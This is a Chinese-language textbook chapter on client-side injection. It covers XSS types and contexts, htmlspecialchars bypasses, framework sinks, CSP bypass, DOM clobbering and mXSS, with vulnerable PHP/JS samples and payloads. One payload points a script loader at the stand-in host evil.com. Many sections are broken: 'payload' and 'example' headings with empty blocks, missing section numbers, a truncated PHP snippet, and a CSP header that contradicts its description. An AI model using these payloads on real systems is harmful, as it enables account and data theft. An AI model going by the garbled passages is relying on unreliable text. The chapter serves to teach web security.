# 第 4 章 客户端注入攻击

## 4.1 XSS 简介

跨站脚本（XSS）几十年来一直是一个安全问题。问题始于 JavaScript 最初被引入以通过动态内容增强用户体验。然而，当时安全并不是主要关注点，因为网络大部分是静态内容。随着 JavaScript 的发展，允许更多动态和交互式内容，XSS 成为了一个现实世界的问题，尽管当时大部分逻辑仍然在服务器端。

在过去十年中，Angular、React 和 Vue.js 等 JavaScript 框架变得流行，大量逻辑被转移到客户端。同样，单页应用程序（SPA）的兴起增加了 XSS 的攻击面，因为它们严重依赖客户端渲染。现代 Web 应用程序通常集成第三方服务和脚本，进一步增加了 XSS 的攻击面。

在此期间，浏览器和开发框架已经设计了多种解决方案来防御 XSS。这些方案包括 Internet Explorer 和 Chrome 等浏览器实现的 XSS 过滤器（后来被废弃）。XSS 沙盒、WAF 和基于黑名单的过滤器都尝试过，但都未能成功解决这个问题。迄今为止最有希望的似乎是内容安全策略（CSP）；然而，CSP 在现代企业环境中难以实施、管理和监控。简而言之，如果 CSP 严格，它将直接破坏 Web 应用程序；如果过于宽松，则会出现绕过。

在本章中，我们将深入研究 XSS，探索其各种类型以及攻击者如何利用它们。我们还将探讨一系列客户端注入漏洞，以及鲜为人知的攻击，如 DOM 劫持、客户端原型污染和 mXSS 等。

## 4.2 XSS 的类型

当应用程序在将用户提供的输入合并到应用程序响应之前未能正确验证或编码时，就会产生跨站脚本（XSS）。这种疏忽允许攻击者将恶意脚本注入网页。由于 XSS 发生在网站的上下文中，它不受同源策略（SOP）的约束。

XSS 漏洞可以大致分为以下几类：

1. 非持久性/反射型 XSS
2. 持久性/存储型 XSS
3. DOM XSS

XSS 漏洞的分类主要取决于用户输入的处理方式，以及漏洞的根本原因是服务器端代码还是客户端代码。让我们简要介绍每一种：

## 4.3 反射型 XSS

反射型 XSS，也称为非持久性 XSS，当用户提供的输入被服务器直接回显在响应中时发生。此漏洞源于服务器端代码在返回输入给用户之前未能进行清理。让我们看一个易受攻击的 PHP 代码示例：

**易受攻击的代码：**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['x'])) {
    echo $_GET['x'];
}
?>
```

该代码通过 GET 参数 `x` 接收输入，并使用 `echo` 直接返回。

**示例**

## 4.4 理解 XSS 中的上下文

输入的反射可以在应用程序中的多个不同上下文中进行；然而，在某些上下文中可能执行，而在其他上下文中则可能不行。注入的脚本可能因输入在应用程序中反射的位置和方式而异。我们来看一下常见的上下文。

**HTML 上下文**：在 HTML 上下文中，用户控制的输入位于 HTML 元素内。

**示例**
```html
<div>[用户输入在此]</div>
```

**脚本上下文**：在脚本上下文中，用户控制的输入被反射到 script 标签内的属性中。

**示例**
```html
<script>
var input = "[用户输入在此]";
</script>
```

**属性上下文**：在属性上下文中，输入被反射到任何 HTML 元素的属性中，例如 input 标签。

**示例**
```html
<input type="text" value="[用户输入在此]" />
```

**锚点标签上下文**：在此上下文中，输入被反射到锚点标签 `<a>` 的 href 属性中。

**示例**
```html
<a href="[用户输入在此]">链接</a>
```

让我们以一个页面为例，该页面接收输入并在所有这些上下文中进行反射。

**有效载荷**

## 4.6 绕过 htmlspecialchars

从之前的例子可以清楚地看出，通过不同上下文传递的输入在反射到应用程序响应之前必须进行编码或清理。为此，几种服务器端语言提供了内置函数；如今许多框架默认应用这些函数，从而减轻了开发人员的负担。

PHP 中一个这样的流行函数是 `htmlspecialchars`；它可用于将特殊字符转换为 HTML 实体，以尝试防止 XSS。然而，该解决方案并不适用于所有上下文，并且在某些情况下可以被绕过。为了理解其工作原理，请考虑以下代码，它通过 GET 参数 `x` 接收输入，并在反射到应用程序响应之前通过 `htmlspecialchars` 函数传递。

**示例**
```php

    echo htmlspecialchars($_GET['x']);
}
?>
```

## 4.9 在 SVG 上下文中绕过 htmlspecialchars

在一种场景中，Web 应用程序使用带有 `ENT_QUOTES` 的 `htmlspecialchars` 函数过滤用户输入并将其反射到 SVG 上下文中，仍然可以执行 JavaScript。我们来看以下示例：

**示例**
```html
<svg><script>let myvar="YourInput";</script></svg>
```

为了跳出 `myvar` 变量的上下文，我们将提供以下有效载荷：

**有效载荷**
```
";alert(1)//
```

由于 `htmlspecialchars` 函数生效，它将引号（`"`）编码为 `&quot;`。然而，JavaScript 仍然会执行。

**响应**
```html
<svg><script>letmyvar="text&quot;;alert(1)//";</script></svg>
```

**图 4.9 在 SVG 上下文中执行 XSS 有效载荷**

其原理如下：当 HTML 解析器遇到 `<script>` 标签时，它会将内部所有内容解释为 JavaScript 代码。由于解析器不将 HTML 实体 `&quot;` 识别为双引号，因此它将其视为字符串的一部分。然而，当浏览器处理 SVG 标签时，它会对 SVG 内容应用 XML 解析规则。因此，XML 解析器将 `&quot;` 转换回双引号（`"`），从而允许它跳出属性上下文并执行 JavaScript。

虽然此场景是人为构造的，但它展示了修复 XSS 漏洞的复杂性。一种可能的解决方法是双重编码字符，而不是单次编码。

## 4.10 存储型 XSS

存储型 XSS，也称为持久性 XSS，当应用程序将用户提供的输入存储在 Web 服务器、数据库等中，并且这些输入随后未经清理而显示时发生。反射型和存储型 XSS 的主要区别在于，反射型 XSS 中输入立即回显给用户，而在存储型 XSS 中，输入在后续阶段反射。这种特殊变体尤其危险，因为在许多情况下，它不需要用户交互，并且有可能广泛传播，影响多个用户。让我们看一个易受攻击的代码示例：

**易受攻击的代码**
```php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $message = $conn->real_escape_string($_POST['message']);
    $user_id = $_SESSION['user_id'];
    $sql = "INSERT INTO messages (user_id, message) VALUES ('$user_id', '$message')";
    if ($conn->query($sql) === TRUE) {
        echo "Comment posted successfully";
    } else {
        echo "Error: ". $sql. "<br>". $conn->error;
    }
}
if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "<p>". $row["message"]. "</p>";
    }
} else {
    echo "No Comments";
}
```

该代码来自一个包含用户评论表单的应用程序。代码获取用户输入并将其存储到数据库中。输入通过 `real_escape_string` 函数传递，该函数用于防止 SQL 注入。然而，没有检查来防止 HTML/JavaScript 代码的注入，因此当评论表单显示时，会导致 XSS。

**有效载荷：**
```html
<img src=x onerror=alert(document.domain)>
```

**图 4.10 执行 XSS 有效载荷**

由于有效载荷存储在数据库中，并将提供给每个查看评论的用户，JavaScript 将在每个用户的浏览器上下文中执行，其后果可能广泛传播。

### 4.10.1 DOM 型 XSS

文档对象模型（DOM）提供了 JavaScript 用于动态访问和修改网页内容和结构的接口。当用户提供的输入未经清理而用于动态更新 DOM 时，就会发生 DOM XSS。DOM XSS 与其他形式的 XSS 之间的一个关键区别是，DOM XSS 源自客户端代码而不是服务器端代码。这意味着恶意请求永远不会发送到服务器；因此，服务器端安全措施（如 WAF 和服务器端过滤器）对 DOM XSS 攻击无效。

DOM XSS 的概念最初由 Amit Klein 在 2005 年发表的题为 "DOM Based Cross Site Scripting or XSS of the Third Kind" [www.webappsec.org/projects/articles/071105.shtml] 的论文中提出。在发表时，由于网站不严重依赖客户端脚本，该论文并未立即受到欢迎。然而，随着 Web 的发展，变得更加动态并依赖客户端 JavaScript，DOM XSS 的相关性显著增加。

**易受攻击的代码：**
```javascript
function trackSearchQuery() {
    var params = new URLSearchParams(window.location.search);
    var searchQuery = params.get('search');
    if (searchQuery) {
        document.write('<div>Search query: ' + searchQuery + '</div>');
    }
}
```

在此 JavaScript 代码中，函数 `trackSearchQuery` 使用 `URLSearchParams` 从 URL 的查询字符串中检索 `search` 参数的值。该值直接用于 `document.write`，未经任何清理或编码。

**有效载荷：**
```
<script>alert(document.domain)</script>
```

## 4.11 来源与汇点

在深入探讨 DOM XSS 之前，我们将讨论此漏洞上下文中的来源（Sources）和汇点（Sinks）的概念。来源被定义为用户输入，汇点可以被定义为可能不安全的函数，可用于动态生成 HTML 或 JavaScript 而未经清理。以下是一些常见来源和汇点的非详尽列表：

**来源**
- `document.URL`
- `document.referrer`
- `location`
- `location.href`
- `location.search`
- `location.hash`
- `location.pathname`

**汇点**
- `eval`
- `setTimeout`
- `setInterval`
- `document.write`
- `element.innerHTML`

多年来，已经识别出许多新的汇点。每个 JavaScript 框架都有自己的汇点集。你可以在 DOM XSS Wiki [https://github.com/wisec/domxsswiki/wiki] 找到 DOM XSS 来源和汇点的全面列表。

**DOM XSS 来源和汇点：**

为了说明 DOM XSS 的工作原理，让我们看一个直接来自 Amit Klein 论文的示例：

**易受攻击的代码**
```html
<HTML>
```

**示例**
```

```

## 4.13 jQuery DOM XSS

DOM XSS 也可能发生在第三方库和框架中，如果这些库用于使用用户提供的输入动态更新 DOM。所有这些第三方库都有其独特的汇点集。jQuery 提供了诸如 `.after()`、`.before()`、`.prepend()`、`.replaceWith()` 等方法，可用于将内容插入 DOM。如果这些方法在未清理不受信任数据的情况下使用，它们可能导致 DOM XSS。让我们检查几个针对 jQuery 的示例：

## 4.14 jQuery 示例 #1

在 jQuery 上下文中，最常见的汇点可能是 jQuery 的选择器函数 `$()`。此函数可以将字符串转换为 DOM 元素。如果输入来自不受信任的来源，则可能导致 DOM XSS。考虑以下代码：

**易受攻击的代码**
```javascript
$(function() {
    var searchParams = new URLSearchParams(window.location.search);
    var query = searchParams.get('query');
    if (query) {
        $('#searchResults').html('Results for: ' + query);
    }
});
```

该代码从来源 `window.location.search` 获取输入，该来源表示 URL 中 `?` 之后的部分。然后，它从 URL 中提取 `query` 参数，并将其传递给 `$()` 函数以动态修改网页内容，显示基于所提供查询的搜索结果。由于输入在传递给危险汇点之前未经清理，将导致 XSS。

**有效载荷：**
```html
<script>alert(document.domain)</script>
```

### 4.15.1 客户端模板注入

客户端模板引擎允许开发人员将 HTML 的结构与用 JavaScript 编写的逻辑分离。开发人员可以为常见的网页元素（如标题、页脚等）创建模板；这些模板可以在应用程序的不同部分重用，从而减少冗余。这些模板引擎允许动态渲染内容。这样，就可以根据用户交互或事件更改内容，而无需完全重新加载页面。

当用户提供的输入被不适当地混入 Web 模板时，就会产生客户端模板注入（CSTI）漏洞。此问题经常出现在使用客户端模板框架（如 Angular、React 和 Vue.js）的 Web 应用程序中，这些框架将用户输入动态纳入渲染过程。如果这些输入未经正确清理，它们可能会被模板引擎解释为模板代码的一部分，从而可能导致 XSS。

## 4.16 AngularJS 中的 XSS

AngularJS 的初始版本实现了沙盒来防御 XSS 漏洞。沙盒通过阻止访问全局对象和属性（如 `window` 和 `document`）以及其他潜在危险属性来工作。在这种情况下，如果用户尝试执行 `alert` 函数，它将被限定在本地范围，不会影响全局环境。由于沙盒通过限制对全局属性（如 `window`）的访问来工作，沙盒绕过主要围绕寻找执行 JavaScript 的替代方法。

然而，随着时间的推移，这些沙盒被反复绕过，并最终因为维护安全沙盒的挑战而被放弃，因此 Angular 的后续版本放弃了沙盒方法，并遭遇了与其他 XSS 保护机制（如 IE XSS Filter 和 Chrome XSS Auditor）相同的命运。

相反，重点转向了替代安全机制，如自动转义输入和严格的上下文转义，以安全地处理用户输入和表达式评估 [https://angular.io/guide/security]。

## 4.17 ReactJS 中的 XSS

ReactJS 与 AngularJS 不同，它不使用沙盒来保证安全。相反，它依赖于严格的上下文转义和编码来防止 XSS 攻击。React 自动转义插入 DOM 的所有字符串，将潜在危险字符转换为其安全的编码等效项。这确保了任何输入都被视为纯文本而不是可执行代码。

然而，ReactJS 确实提供了一种通过特定函数直接向 DOM 插入 HTML 内容的机制。这类函数的一个示例是 `dangerouslySetInnerHTML`，它设置 DOM 元素的 `innerHTML` 属性。"dangerously" 这个名称本身就是一个警告，表明应谨慎使用。因此，通过 `dangerouslySetInnerHTML` 分配用户提供的输入可能存在风险：

**示例**
```jsx
<div dangerouslySetInnerHTML={{__html: '<script>alert(1);</script>'}} />
```

在此示例中，`dangerouslySetInnerHTML` 用于插入原始 HTML，如果未经适当清理，可能包含恶意脚本。

有人可能问为什么 ReactJS 不消除此函数而仅依赖安全函数。原因在于，存在开发人员需要插入 HTML 内容的合法情况。这包括与动态生成 HTML 的第三方库集成，或使用富格式化的 WYSIWYG 编辑器等场景。有时，也出于性能原因选择此方法。该方法本身并不危险；当用户提供的输入未经适当清理或验证而处理时，才会变得危险。

类似地，虽然 React 在许多上下文中确实会自动转义值以防止 XSS，但其自动转义并非在所有上下文中都有效。例如，考虑以下场景，用户提供的输入在锚点标签的上下文中使用：

**示例**
```jsx
<a href={data} className="tmgm">Click Here</a>
```

在此情况下，如果用户提供 XSS 有效载荷如 `javascript:alert(1)`，React 的内置转义将无法阻止 JavaScript 的执行。

## 4.24 内容安全策略（CSP）绕过

CSP 是防止 XSS 攻击的最有效方法。然而，Web 管理员为了适应 Web 应用程序的功能而无意中放宽 CSP 是很常见的，这可能导致漏洞。在本节中，我们将讨论常见的 CSP 错误配置，这些配置可能导致绕过并最终导致 XSS。

## 4.25 CSP 绕过：示例 #1 unsafe-inline

在 CSP 中，`script-src` 指令用于将指定脚本源列入白名单。如果将 `script-src` 设置为 `self`，则表示仅允许加载同源的脚本。以下是标准策略的样子：

```
Content-Security-Policy: script-src 'unsafe-inline';
```

有时，`script-src` 指令可能设置为 `unsafe-inline`；这虽然会阻止未列入白名单的第三方脚本加载，但同时允许内联脚本元素、事件处理程序和 JavaScript URL 执行。

考虑以下 XSS 有效载荷，它内联注入 JavaScript；它与此策略兼容：

**有效载荷：**

## 4.26 CSP 绕过：示例 #2——第三方端点和 "unsafe-eval"

## 4.29 利用浏览器漏洞实现 XSS

不同的浏览器可能以不同的方式解释 HTML、CSS 和 JavaScript，对 `javascript:` 和 `data:` 等协议的处理方式也可能不同，并且可能具有不同的 DOM 实现。因此，这些特定于浏览器的怪癖和特性可用于利用边缘情况 XSS。我们来看一个关于 `document.domain` 属性及其在旧版 Safari 中影响的示例。

## 4.30 SOP 与 document.domain

在同源策略（SOP）下，两个子域不能相互交互。换句话说，在 `vulnerable.example.com` 上的脚本无法访问或修改 `subdomain.example.com` 上的内容，反之亦然。为了促进交互，我们可以使用 `document.domain` 属性。通过在两个域上设置 `document.domain = "example.com"`，将有效地允许浏览器将它们视为属于同一源。

这在 HTML5 功能（如跨域资源共享（CORS））变得普遍之前，常用于放宽 SOP 的规则。

这只有在两个子域共享同一主域时才有可能，但如果我们有不同的域，如 `evil.com` 和 `target.com`，并且我们可以将两者的 `document.domain` 属性设置为顶级域（TLD）如 `com`，会怎样？理论上，这将导致它们被视为具有相同的源。然而，在现代浏览器中，将 TLD `com` 或任何其他 TLD（如 .net、co.uk）分配给 `document.domain` 属性将导致错误。

**图 4.42 设置 document.domain 属性时 Chrome 控制台的输出**

然而，在旧版 Safari 中，可以在不同域之间将 `document.domain` 属性设置为 `com`，允许它们被视为同一源。为了利用这一点，需要找到网站中允许从用户控制的输入设置 `document.domain` 的漏洞。

## 4.31 DOM 劫持

即使在无法注入传统 XSS 向量的场景中；然而，有可能注入 HTML。仍然可以利用一种称为 DOM 劫持的技术来操纵网页的行为。这种技术可能导致恶意重定向、破坏标记过滤器，并可能间接导致 XSS 场景。

在 DOM 劫持中，攻击者利用 HTML 中的 `id` 和 `name` 属性来覆盖全局 JavaScript 变量、函数或文档属性。这可能导致覆盖已存在的全局变量或函数（如 `window`），如果它们具有相同的名称或 ID。

## 4.32 id 和 name 属性

类似地，对于 `name` 属性，某些 HTML 元素（如 `embed`、`form`、`iframe`、`image`、`img` 和 `object`）可以使用 `name` 属性在 `window` 对象下创建引用。如果这些元素的 `name` 属性与现有的全局变量或函数重合，则原始的 JavaScript 引用将被“劫持”或覆盖。

## 4.33 示例 1：使用锚点标签覆盖全局变量

在 DOM 劫持方面，最常见的用例可能是使用锚点标签覆盖全局变量。这尤其有趣，因为其 `toString()` 方法的独特行为。在 JavaScript 中，`toString()` 方法是一个用于将对象转换为字符串的函数。当一个锚点元素劫持一个全局变量时，引用此变量将返回锚点 `href` 属性的值。

**图 4.48 劫持返回 href 属性的值**

相反，当你尝试劫持一个对象（如 Form 对象）时，引用它时，返回的不是特定属性（如 `action`），而是一个通用字符串，如 `[object HTMLFormElement]`。

**图 4.49 劫持返回 form**

在此背景下，让我们考虑以下代码：

**易受攻击的代码**
```html
<script>
window.onload = function() {
    var scriptUrl = window.url || "http://saferurl.com";
    var script = document.createElement('script');
    script.src = scriptUrl;
    document.head.appendChild(script);
};
</script>
```

该代码旨在动态加载脚本。它使用 `window.url` 来确定脚本的 URL。如果 `window.url` 未定义，它将回退到 `http://saferurl.com`。使用全局属性 `window.url` 使其容易受到 DOM 劫持。

攻击者可以通过注入一个具有 `id` 为 `url` 的锚点标签（`<a>`）并在其 `href` 属性中包含恶意 URL 来利用此漏洞，例如：

**有效载荷**
```html
<a id="url" href="http://evil.com/evil.js"></a>
```

此注入的元素将覆盖 `window.url` 全局变量，将其指向锚点元素。当脚本访问 `window.url` 以加载外部脚本时，它将调用锚点元素的 `toString()` 方法，该方法将返回被劫持的值。

## 4.36 使用 DOM 劫持破坏 GitHub Gist

此问题的一个真实案例是 GitHub 的 Gist 中发现的 DOM 劫持 [https://bounty.github.com/researchers/avlidienbrunn.html#javascript-namespace-clobbering-20140311]。该服务允许用户共享和评论代码片段。评论系统被设计为接受用户评论中有限的 HTML 标签集。安全研究员 "Mathias Kalson" 发现了一个 DOM 劫持漏洞，覆盖某些元素可能会破坏 Gist 平台的功能。

**有效载荷：**
```html
<img src='something.png' name='querySelector'>
```

第一个有效载荷会导致 `document.querySelector` 返回图像元素，而不是执行其选择 DOM 元素的典型功能。类似地，以下有效载荷被用于覆盖 `getElementById` 和 `removeEventListener` 属性。

**有效载荷：**
```html
<img src="something.png" name="getElementById">
<img src="image.png" name="removeEventListener">
```

第一个有效载荷对于通过 ID 访问页面元素至关重要，而第二个对于管理事件监听器至关重要。因此，通过覆盖这些变量，负责处理 Gist 评论的 JavaScript 代码变得无响应。

## 4.37 基于突变的 XSS（mXSS）

mXSS 特别因浏览器处理畸形 HTML 的独特方式而发生。当浏览器解析畸形 HTML 时，它们遵循特定的解析规则，并尝试解释和尝试纠正畸形输入的结构。此过程在某些浏览器中称为 "tag soup" 解析。解析器进行有根据的猜测来关闭标签、正确嵌套元素，并创建连贯的 DOM 结构。

然而，这些突变有时可以将完全安全和无害的输入转换为危险的内容，当浏览器渲染时导致 XSS 漏洞。

关于 mXSS 最早发表的论文之一题为 "mXSS Attacks: Attacking Well-Secured Web-Applications by Using InnerHTML Mutations" [https://cure53.de/fp170.pdf]。该论文重点关注 `innerHTML` 属性的滥用如何导致 mXSS。

该论文使用以下图表描述 mXSS 的流程。攻击者提供无害输入，该输入通过服务器端 XSS 过滤器或 WAF 传递，然后通过客户端 XSS 过滤器传递，最终到达 `innerHTML` 属性，在那里被突变后发送到渲染引擎——这就是 XSS 发生的地方。

注意：`innerHTML` 属性是一种强大的 JavaScript 方法，用于将原始 HTML 字符串插入元素。当设置此属性时，浏览器解析 HTML 字符串并形成 DOM 树，包括对畸形 HTML 的错误修正。读取 `innerHTML` 然后将 DOM 树序列化回 HTML 字符串，也包括对字符串进行的任何突变。

**图 4.53 来自 "mXSS Attacks" 论文的 mXSS 流程图**

例如，论文中展示的影响旧版 IE 的 mXSS 攻击向量之一如下：

**有效载荷**
```html
<imgstyle="font-fa\\22onerror\\3d\\61lert\\28\\31\\29\\20mily:'arial'"src="x:x" />
```

此向量包含一个 `onerror` 事件处理程序，它位于 style 属性内，因此将被视为字符串。然而，当通过易受攻击的 JavaScript 版本中的 `innerHTML` 属性传递时，浏览器会突变该字符串，导致 `onerror` 跳出 style 上下文并执行 JavaScript。

**输出**
```html
<IMG style="font-fa"onerror=alert(1)mily:'arial'"src="x:x">
```

在当今世界，现代浏览器已弃用客户端 XSS 过滤器；然而，其余概念基本相同。此外，mXSS 的早期变种主要针对 Internet Explorer；今天的变种则针对其他浏览器。在深入探讨示例之前，让我们先探索浏览器中的突变过程：考虑以下畸形 HTML，其中 `<div>` 标签未正确关闭。

**示例 1：**


**示例 2：**
```html

```

诸如 Webmail、CMS、论坛等应用程序通常为用户提供插入 HTML 的功能。这些可能导致畸形输入，尤其是允许插入 HTML 的 WYSIWYG 编辑器。这些可能允许用户输入恶意的 HTML/JavaScript 代码。为了防止这种情况，使用了清理器和净化器。它们通过编码剥离恶意输入或将不安全输入转换为安全等效项来工作。然而，这些清理器/净化器如果未正确实现，可能会促成 mXSS。

在 mXSS 攻击中，攻击者构造一个畸形输入，清理器将其视为安全输入，应用修正并将其处理给 HTML 解析器。然而，一旦此输入被浏览器处理，浏览器的解析逻辑会将其转换为可执行的 JavaScript。让我们看一个现实世界的示例，展示清理器和 HTML 解析器之间的不匹配如何导致 mXSS。

## 4.38 mXSS Mozilla Bleach Clean 函数 CVE-2020-6802

让我们考虑 Mozilla bleach.clean 函数中一个有趣的 mXSS 漏洞案例。该漏洞是一个案例研究，展示了当清理库未能完全考虑 HTML 解析的复杂性以及不同元素和属性使用的上下文时，如何导致 mXSS 漏洞。让我们看一个通过 bleach.clean 函数传递的有效载荷示例：

**有效载荷**
```html
<noscript><style></noscript><img src=x onmouseover=alert(1)>
```

由 bleach.clean 函数渲染的输出如下：

**清理器渲染的输出**
```html
<noscript><style></noscript><img src=x onmouseover=alert(1)></style></noscript>
```

在此实例中，bleach.clean 函数试图通过关闭它发现打开的 style 和 noscript 标签来清理输入。然而，该函数假设 `<style>` 标签内的任何内容都是 CSS 表达式，这是一个重大疏忽。理想情况下，清理器应识别注入的 `<img>` 标签及其 `onmouseover` 事件在 `<style>` 上下文中可能危险或不合适。

## 4.39 浏览器 HTML 解析器的行为

当浏览器的 HTML 解析器处理清理后的输出时，它会删除关闭的 style 和 noscript 标签。如前所述，这是 HTML 解析器的常见行为，它将修正畸形 HTML，因此由于解析器的修正，之前不活跃的 `<img>` 标签变为活跃，触发 JavaScript 代码，导致 mXSS。

**HTML 解析器输出**
```html
<noscript><style></noscript><img src=x onmouseover=alert(1)>
```
